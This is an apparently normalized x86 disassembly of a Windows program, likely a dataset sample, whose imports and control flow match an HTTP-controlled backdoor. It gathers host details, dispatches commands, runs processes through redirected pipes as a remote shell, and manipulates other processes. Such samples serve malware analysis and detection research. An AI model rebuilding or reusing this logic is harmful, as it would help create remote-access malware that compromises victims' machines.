sub_401020
mov edx [ esp + 0x4 ]
push esi
mov esi ecx
xor eax eax
mov ecx [ esp + 0x1c ]
push edx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov [ esi + 0x20 ] eax
mov eax [ esp + 0x1c ]
mov [ esi + 0x10 ] ecx
mov ecx esi
mov [ esi ] r--data
mov [ esi + 0x24 ] eax
call sub_4011e0
mov eax [ esp + 0x10 ]
mov ecx esi
push eax
call sub_401250
mov ecx [ esp + 0xc ]
push ecx
mov ecx esi
call sub_4012e0
mov edx [ esp + 0x14 ]
mov ecx esi
push edx
call sub_401350
mov eax esi
pop esi
retn 0x18
sub_401090
push esi
mov esi ecx
mov [ esi ] r--data
call sub_401520
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov esi [ esi + 0x20 ]
test esi esi
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
pop esi
retn
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_4010e0
push ecx
push ebx
push esi
push edi
mov esi ecx
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push 0x0
push 0x0
push eax
call [ InternetOpenA@IAT ]
test eax eax
mov [ esi + 0x4 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
lea edi [ esi + 0x10 ]
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn
mov ebx [ esp + 0xc ]
mov ebx [ InternetSetOptionA@IAT ]
push 0x4
push edi
push 0x5
push eax
call ebx
mov ecx [ esi + 0x4 ]
push 0x4
push edi
push 0x2
push ecx
call ebx
mov edx [ esi + 0x4 ]
push 0x4
push edi
push 0x6
push edx
call ebx
mov ebx eax
jmp r-xdata
mov edi 0x84000100
mov eax 0x50
mov edi 0x84803100
mov eax 0x1bb
jmp r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov edx [ esi + 0x14 ]
push 0x0
push edi
push 0x0
push rw-data
push 0x0
push edx
push rw-data
push eax
call [ HttpOpenRequestA@IAT ]
mov edx eax
test edx edx
mov [ esi + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn
mov ecx [ esi + 0x4 ]
push 0x0
push 0x0
push 0x3
push rw-data
push rw-data
push eax
mov eax [ esi + 0x18 ]
push eax
push ecx
call [ InternetConnectA@IAT ]
test eax eax
mov [ esi + 0x8 ] eax
jne r-xdata
mov esi [ esi + 0x20 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn
pop edi
mov eax ebx
pop esi
pop ebx
pop ecx
retn
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
push 0x20000000
push 0xffffffff
push esi
push edx
call [ HttpAddRequestHeadersA@IAT ]
mov ebx eax
sub_4011e0
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
push edi
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ esi + 0x18 ]
not ecx
dec ecx
test eax eax
mov edi ecx
je r-xdata
pop esi
xor eax eax
pop ebx
retn 0x4
inc edi
push edi
call ??2@YAPAXI@Z
mov edx eax
mov edi ebx
or ecx 0xffffffff
xor eax eax
add esp 0x4
mov [ esi + 0x18 ] edx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
retn 0x4
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_401250
push ebx
push esi
mov esi [ esp + 0xc ]
mov ebx ecx
test esi esi
jne r-xdata
push ebp
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ ebx + 0x14 ]
not ecx
dec ecx
test eax eax
mov ebp ecx
je r-xdata
pop esi
xor eax eax
pop ebx
retn 0x4
lea eax [ ebp + 0x2 ]
push eax
call ??2@YAPAXI@Z
mov edx eax
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0x4
mov [ ebx + 0x14 ] edx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x14 ]
lea eax [ ecx + ebp ]
mov cl [ ecx + ebp - 0x1 ]
cmp cl 0x2f
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop ebp
pop esi
mov eax 0x1
pop ebx
retn 0x4
mov [ eax ] 0x2f
mov edx [ ebx + 0x14 ]
mov [ edx + ebp + 0x1 ] 0x0
sub_4012e0
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
push edi
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ esi + 0x1c ]
not ecx
dec ecx
test eax eax
mov edi ecx
je r-xdata
pop esi
xor eax eax
pop ebx
retn 0x4
inc edi
push edi
call ??2@YAPAXI@Z
mov edx eax
mov edi ebx
or ecx 0xffffffff
xor eax eax
add esp 0x4
mov [ esi + 0x1c ] edx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
retn 0x4
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_401350
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
push edi
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ esi + 0x20 ]
not ecx
dec ecx
test eax eax
mov edi ecx
je r-xdata
pop esi
xor eax eax
pop ebx
retn 0x4
inc edi
push edi
call ??2@YAPAXI@Z
mov edx eax
mov edi ebx
or ecx 0xffffffff
xor eax eax
add esp 0x4
mov [ esi + 0x20 ] edx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
retn 0x4
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_4013c0
sub esp 0x44
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
push ebx
mov ebx [ esp + 0x54 ]
push ebp
mov ebp [ sprintf@IAT ]
push edi
push ebx
lea eax [ esp + 0x18 ]
push rw-data
push eax
call ebp
mov edx [ esi + 0xc ]
add esp 0xc
lea ecx [ esp + 0x14 ]
push 0xa0000000
push 0xffffffff
push ecx
push edx
call [ HttpAddRequestHeadersA@IAT ]
mov eax [ esp + 0x58 ]
mov ecx [ esi + 0xc ]
push ebx
push eax
push 0x0
push 0x0
push ecx
call [ HttpSendRequestA@IAT ]
mov edi eax
test edi edi
jne r-xdata
xor eax eax
pop esi
add esp 0x44
retn 0x8
mov eax edi
pop edi
pop ebp
pop ebx
pop esi
add esp 0x44
retn 0x8
call [ GetLastError@IAT ]
cmp eax 0x2f0d
jne r-xdata
mov ecx [ esi + 0xc ]
lea edx [ esp + 0x10 ]
lea eax [ esp + 0x5c ]
push edx
push eax
push 0x1f
push ecx
mov [ esp + 0x20 ] 0x4
call [ InternetQueryOptionA@IAT ]
mov eax [ esp + 0x5c ]
lea edx [ esp + 0x5c ]
or ah 0x1
push 0x4
mov [ esp + 0x60 ] eax
mov eax [ esi + 0xc ]
push edx
push 0x1f
push eax
call [ InternetSetOptionA@IAT ]
test eax eax
je r-xdata
push ebx
lea ecx [ esp + 0x18 ]
push rw-data
push ecx
call ebp
mov eax [ esi + 0xc ]
add esp 0xc
lea edx [ esp + 0x14 ]
push 0xa0000000
push 0xffffffff
push edx
push eax
call [ HttpAddRequestHeadersA@IAT ]
mov ecx [ esp + 0x58 ]
mov edx [ esi + 0xc ]
push ebx
push ecx
push 0x0
push 0x0
push edx
call [ HttpSendRequestA@IAT ]
mov edi eax
test edi edi
je r-xdata
sub_4014f0
mov edx [ esp + 0x4 ]
push esi
test edx edx
mov esi ecx
jne r-xdata
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push edx
mov ecx esi
call sub_4013c0
pop edi
pop esi
retn 0x4
xor eax eax
pop esi
retn 0x4
sub_401520
push esi
mov esi ecx
push edi
mov edi [ InternetCloseHandle@IAT ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0xc ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0x8 ] 0x0
pop edi
mov eax 0x1
pop esi
retn
push eax
call edi
mov [ esi + 0x4 ] 0x0
sub_401570
push 0xffffffff
push sub_40438b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x27c
mov eax [ esp + 0x28c ]
push ebx
push ebp
xor ebp ebp
cmp eax ebp
mov [ esp + 0x18 ] ebp
mov [ esp + 0x20 ] ebp
mov [ rw-data ] ebp
je r-xdata
mov ecx [ esp + 0x284 ]
pop ebp
xor eax eax
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x288
retn
cmp [ esp + 0x298 ] ebp
je r-xdata
push 0x400
call ??2@YAPAXI@Z
mov ebx eax
add esp 0x4
cmp ebx ebp
mov [ esp + 0x2c ] ebx
je r-xdata
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi ebx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ esp + 0x18 ] 0x10
lea eax [ ecx + ebx ]
lea ecx [ esp + 0x18 ]
push ecx
push eax
mov [ esp + 0x24 ] eax
call [ GetComputerNameA@IAT ]
mov edx [ esp + 0x2a8 ]
mov eax [ esp + 0x2a4 ]
mov ecx [ esp + 0x2a0 ]
push 0x36ee80
push edx
mov edx [ esp + 0x2a4 ]
push ebx
push eax
push ecx
push edx
lea ecx [ esp + 0x58 ]
call sub_401020
mov [ esp + 0x294 ] ebp
cmp ebp 0x5
je r-xdata
lea ecx [ esp + 0x40 ]
call sub_401520
push 0xea60
inc ebp
call [ Sleep@IAT ]
cmp ebp 0x5
jb r-xdata
mov ebp [ esp + 0x30 ]
jmp r-xdata
push 0x10000
call ??2@YAPAXI@Z
push 0x1000
mov ebp eax
call ??2@YAPAXI@Z
add esp 0x8
mov [ esp + 0x10 ] eax
test ebp ebp
je r-xdata
lea ecx [ esp + 0x40 ]
call sub_4010e0
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
test eax eax
je r-xdata
lea ecx [ esp + 0x40 ]
call sub_401520
test ebp ebp
je r-xdata
mov edx [ rw-data ]
push 0x0
push edx
call [ TerminateProcess@IAT ]
mov eax [ rw-data ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
push 0x200
call ??2@YAPAXI@Z
add esp 0x4
mov [ esp + 0x2c ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push ebp
call ??3@YAXPAX@Z
add esp 0x4
mov esi [ CreatePipe@IAT ]
lea eax [ esp + 0x74 ]
push 0x0
lea ecx [ esp + 0x40 ]
push eax
lea edx [ esp + 0x40 ]
mov edi 0x1
push ecx
push edx
mov [ esp + 0x84 ] 0xc
mov [ esp + 0x8c ] edi
mov [ esp + 0x88 ] 0x0
call esi
test eax eax
je r-xdata
push ebx
call ??3@YAXPAX@Z
mov eax [ esp + 0x30 ]
add esp 0x4
test eax eax
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
lea eax [ esp + 0x68 ]
push 0x0
lea ecx [ esp + 0x28 ]
push eax
lea edx [ esp + 0x38 ]
push ecx
push edx
mov [ esp + 0x78 ] 0xc
mov [ esp + 0x80 ] edi
mov [ esp + 0x7c ] 0x0
call esi
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov esi [ CloseHandle@IAT ]
push ecx
call esi
mov edx [ rw-data ]
push edx
call esi
mov eax [ esp + 0x38 ]
cmp eax 0xffffffff
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
lea eax [ esp + 0x80 ]
push 0x104
push eax
call [ GetWindowsDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x80 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x80 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ SetCurrentDirectoryA@IAT ]
mov ecx [ esp + 0x1c ]
push ecx
push rw-data
push ebp
call [ sprintf@IAT ]
add esp 0xc
mov eax [ esp + 0x3c ]
cmp eax 0xffffffff
je r-xdata
push eax
call esi
mov eax [ esp + 0x28 ]
test eax eax
jne r-xdata
test esi esi
jne r-xdata
mov eax [ esp + 0x30 ]
cmp eax 0xffffffff
je r-xdata
push eax
call esi
push esi
push ebp
lea ecx [ esp + 0x48 ]
call sub_4013c0
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edx [ esp + 0x20 ]
mov [ ebp ] 0x0
mov eax [ esp + 0x38 ]
push edx
push ebp
push eax
call sub_401e40
add esp 0xc
mov esi eax
mov eax [ esp + 0x24 ]
cmp eax 0xffffffff
je r-xdata
push eax
call esi
cmp ebx 0x5
ja r-xdata
push 0x7530
inc ebx
call [ Sleep@IAT ]
cmp ebx 0x5
ja r-xdata
test esi esi
jne r-xdata
lea ecx [ esp + 0x40 ]
mov [ esp + 0x294 ] 0xffffffff
call sub_401090
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
mov ecx [ esp + 0x27c ]
mov [ fs : 0x0 ] ecx
add esp 0x288
retn
push eax
call esi
mov ebx [ esp + 0x34 ]
mov edx [ esp + 0x10 ]
mov ecx 0x400
xor eax eax
mov edi edx
[ edi ]
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x40 ]
push eax
push 0x1000
push edx
xor esi esi
call sub_4014d0
test eax eax
je r-xdata
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x28 ] 0x1
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov esi ecx
mov eax [ rw-data ]
xor ebx ebx
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
add esi eax
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x1000
lea eax [ esi + edx ]
lea ecx [ esp + 0x48 ]
push eax
call sub_4014d0
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
push ecx
push rw-data
call [ _strcmpi@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov ebx [ esp + 0x10 ]
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x20 ] 0x1
mov [ ebp ] 0x0
jmp r-xdata
push ebx
call sub_401d30
mov [ esp + 0x20 ] eax
mov edi ebx
or ecx 0xffffffff
xor eax eax
add esp 0x4
mov edx [ esp + 0x2c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp [ ebx ] 0x0
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
xor edi edi
push 0x20
push edi
push ebx
call sub_401d80
add esp 0xc
mov esi rw-data
mov eax [ esp + 0x1c ]
cmp [ eax ] 0x0
jne r-xdata
jmp r-xdata
cmp edi 0xa
ja r-xdata
add esi 0x8
inc edi
cmp esi rw-data
jl r-xdata
mov ebx [ esp + 0x1c ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ esp + 0x2c ]
jmp [ edi * 4 + jump_table_401ca0 ]
mov ecx [ rw-data ]
push ecx
push esi
call [ _strcmpi@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov esi ecx
mov edi rw-data
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x24 ]
push eax
push edx
call sub_401cd0
add esp 0x8
mov [ esp + 0x20 ] 0x1
jmp r-xdata
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x30 ]
push edx
push eax
push ebp
call sub_401f60
add esp 0xc
jmp r-xdata
lea ecx [ esp + 0x40 ]
push ecx
push ebp
call sub_4022b0
add esp 0x8
jmp r-xdata
lea edx [ esp + 0x40 ]
push edx
push ebp
call sub_402730
add esp 0x8
jmp r-xdata
mov eax [ esp + 0x29c ]
push 0x0
push 0x0
push ebp
push sub_402900
push 0x0
push 0x0
mov [ rw-data ] eax
call [ CreateThread@IAT ]
mov esi eax
push 0xffffffff
push esi
call [ WaitForSingleObject@IAT ]
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
lea ecx [ esp + 0x40 ]
push ecx
push ebp
call sub_402e20
add esp 0x8
jmp r-xdata
lea edx [ esp + 0x18 ]
lea eax [ esp + 0x188 ]
push edx
push eax
push 0x2
mov [ esp + 0x24 ] 0x101
call GetUserNameExA
lea edi [ esp + 0x188 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
lea eax [ esp + 0x40 ]
push eax
push ebp
call sub_403020
add esp 0x8
jmp r-xdata
lea ecx [ esp + 0x40 ]
push ecx
push ebp
call sub_403080
add esp 0x8
jmp r-xdata
push rw-data
lea ecx [ esp + 0x44 ]
call sub_4014f0
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
push rw-data
lea ecx [ esp + 0x44 ]
call sub_4014f0
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x1000
push edx
lea ecx [ esp + 0x4c ]
call sub_4014d0
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
mov [ eax + ecx ] 0x0
call [ atoi@IAT ]
add esp 0x4
mov [ esp + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x24 ]
lea ecx [ esp + 0x40 ]
push eax
push ecx
push ebp
call sub_402d10
add esp 0xc
mov [ rw-data ] eax
sub_401cd0
mov edx [ esp + 0x4 ]
push edi
test edx edx
je r-xdata
pop edi
retn
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
mov [ esp + 0x8 ] eax
push eax
lea eax [ esp + 0xc ]
dec ecx
push eax
push ecx
mov ecx [ esp + 0x18 ]
push edx
push ecx
call [ WriteFile@IAT ]
mov ecx [ esp + 0x8 ]
test eax eax
setne al
test ecx ecx
je r-xdata
test al al
je r-xdata
push 0x64
call [ Sleep@IAT ]
sub_401d30
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
xor edx edx
[ edi ]
not ecx
dec ecx
pop edi
je r-xdata
xor eax eax
pop esi
retn
cmp [ edx + esi ] 0xd
jne r-xdata
mov al [ edx + esi ]
test al al
je r-xdata
lea eax [ edx + esi ]
pop esi
retn
mov [ edx + esi ] 0x0
add edx 0x2
cmp al 0xd
je r-xdata
cmp al 0xa
je r-xdata
inc edx
cmp edx ecx
jb r-xdata
sub_401d80
push ecx
mov eax [ esp + 0xc ]
push ebx
push ebp
xor ebp ebp
push esi
cmp eax ebp
push edi
mov [ esp + 0x10 ] ebp
je r-xdata
mov edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x1c ] eax
jmp r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
inc eax
pop ebx
pop ecx
retn
mov esi rw-data
mov bl [ esp + 0x20 ]
mov ecx 0x8
xor eax eax
mov edi rw-data
[ edi ]
mov eax [ esp + 0x1c ]
xor edi edi
cmp eax ebp
mov cl bl
jbe r-xdata
mov dl [ eax ]
cmp dl cl
je r-xdata
test ebp ebp
jne r-xdata
test ebp ebp
je r-xdata
cmp dl 0xd
jne r-xdata
cmp dl 0x22
mov ebp 0x1
jne r-xdata
mov eax [ esp + 0x1c ]
inc edi
cmp edi eax
jb r-xdata
mov edx [ esp + 0x10 ]
xor ebp ebp
add esi 0x4
inc edx
cmp esi rw-data
mov [ eax ] 0x0
mov [ esp + 0x10 ] edx
mov cl bl
je r-xdata
mov edx [ esp + 0x18 ]
lea eax [ edi + edx ]
mov [ esi ] eax
mov cl dl
inc edi
mov eax [ esp + 0x18 ]
add eax edi
mov dl [ eax ]
cmp dl cl
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x8
pop ebx
pop ecx
retn
sub_401e40
sub esp 0xc
push ebx
mov ebx [ esp + 0x18 ]
push ebp
mov ebp [ esp + 0x18 ]
push esi
xor esi esi
push edi
mov edi [ esp + 0x28 ]
mov [ esp + 0x18 ] esi
mov [ esp + 0x14 ] esi
mov [ esp + 0x10 ] esi
mov ecx [ rw-data ]
mov esi [ CloseHandle@IAT ]
push ecx
mov [ rw-data ] 0x0
call esi
mov edx [ rw-data ]
push edx
call esi
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
or ecx 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] eax
[ edi ]
not ecx
sub edi ecx
mov [ rw-data ] eax
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi ebx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov esi ecx
mov eax 0x10000
push 0x0
lea edx [ esp + 0x1c ]
push 0x0
sub eax esi
push edx
lea ecx [ esi + ebx ]
push eax
push ecx
push ebp
call [ PeekNamedPipe@IAT ]
mov eax [ esp + 0x18 ]
test edi edi
je r-xdata
test eax eax
mov [ esp + 0x14 ] 0x0
je r-xdata
test eax eax
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
lea edx [ esp + 0x14 ]
push 0x0
push edx
push eax
lea eax [ esi + ebx ]
push eax
push ebp
call [ ReadFile@IAT ]
test eax eax
je r-xdata
cmp [ esp + 0x10 ] 0xa
jae r-xdata
mov eax [ esp + 0x14 ]
xor edi edi
add esi eax
test eax eax
je r-xdata
push 0x32
call [ Sleep@IAT ]
inc [ esp + 0x10 ]
jmp r-xdata
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0x24 ]
push eax
push ecx
call [ GetExitCodeProcess@IAT ]
cmp [ esp + 0x24 ] 0x103
jne r-xdata
sub_401f60
mov eax [ esp + 0x8 ]
sub esp 0x170
cmp eax 0xffffffff
push ebx
push ebp
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x170
retn
mov ebp [ esp + 0x18c ]
cmp ebp 0xffffffff
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov ebx [ esp + 0x184 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ rw-data ]
lea ecx [ esp + 0x58 ]
push eax
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0xc
lea edi [ esp + 0x58 ]
lea eax [ esp + 0x78 ]
push 0x104
push eax
push rw-data
call [ ExpandEnvironmentStringsA@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x78 ]
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
lea ecx [ esp + 0x78 ]
push 0x104
push ecx
call [ GetSystemDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x78 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
mov ebx [ esp + 0x184 ]
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x78 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x11
lea edi [ esp + 0x14 ]
[ edi ]
mov [ esp + 0x44 ] ax
mov eax [ esp + 0x188 ]
mov [ esp + 0x4c ] eax
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x14 ] 0x44
mov [ esp + 0x40 ] 0x101
mov [ esp + 0x54 ] ebp
mov [ esp + 0x50 ] ebp
je r-xdata
call [ GetLastError@IAT ]
push eax
lea ecx [ esp + 0x5c ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x64 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
mov ebx [ esp + 0x184 ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
lea eax [ esp + 0x14 ]
push rw-data
push eax
push 0x0
push 0x0
push 0x0
push 0x1
push 0x0
lea ecx [ esp + 0x94 ]
push 0x0
push ecx
push 0x0
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x1f4
call [ Sleep@IAT ]
mov [ rw-data ] 0x1
push eax
call [ atol@IAT ]
add esp 0x4
test eax eax
je r-xdata
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
push eax
push 0x0
push 0x1f0fff
call [ OpenProcess@IAT ]
mov ebp eax
cmp ebp 0xffffffff
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ esp + 0x10 ]
push eax
push 0xb
push ebp
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
lea edi [ esp + 0x78 ]
jmp r-xdata
lea edi [ esp + 0x78 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x14 ]
push rw-data
